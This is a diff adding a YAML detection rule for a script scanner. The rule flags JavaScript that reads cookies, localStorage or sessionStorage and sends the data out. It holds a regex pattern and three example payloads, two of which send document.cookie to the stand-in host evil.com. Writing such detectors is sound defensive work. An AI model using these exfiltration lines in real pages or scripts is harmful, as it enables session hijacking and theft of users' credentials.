@@ -1,0 +1,34 @@
+# JavaScript Pattern: Cookie and Storage Theft
+# Detects attempts to exfiltrate cookies or web storage data
+
+id: JS-019
+name: Cookie and Storage Data Theft
+description: |
+  Detects attempts to steal cookies, localStorage, or sessionStorage data by
+  combining storage access with network transmission methods. This pattern
+  identifies cookie stealing, session hijacking, and unauthorized data collection
+  commonly used in XSS attacks and malicious browser extensions.
+languages:
+  - javascript
+detection_type: regex
+detection_logic: '(?:document\.cookie|localStorage|sessionStorage).*(?:fetch|XMLHttpRequest|\.send\(|navigator\.sendBeacon|new\s+Image\(\)|\.src\s*=)'
+severity: Critical
+mitre_technique: T1539
+confidence: 0.90
+category: credential_access
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-01-19"
+  references:
+    - "https://attack.mitre.org/techniques/T1539/"
+    - "https://owasp.org/www-community/attacks/Session_hijacking_attack"
+  tags:
+    - cookie-theft
+    - session-hijacking
+    - data-exfiltration
+    - xss
+  examples:
+    - "fetch('http://evil.com?data=' + document.cookie)"
+    - "new Image().src = 'http://evil.com?c=' + document.cookie"
+    - "fetch('/log', {body: JSON.stringify(localStorage)})"
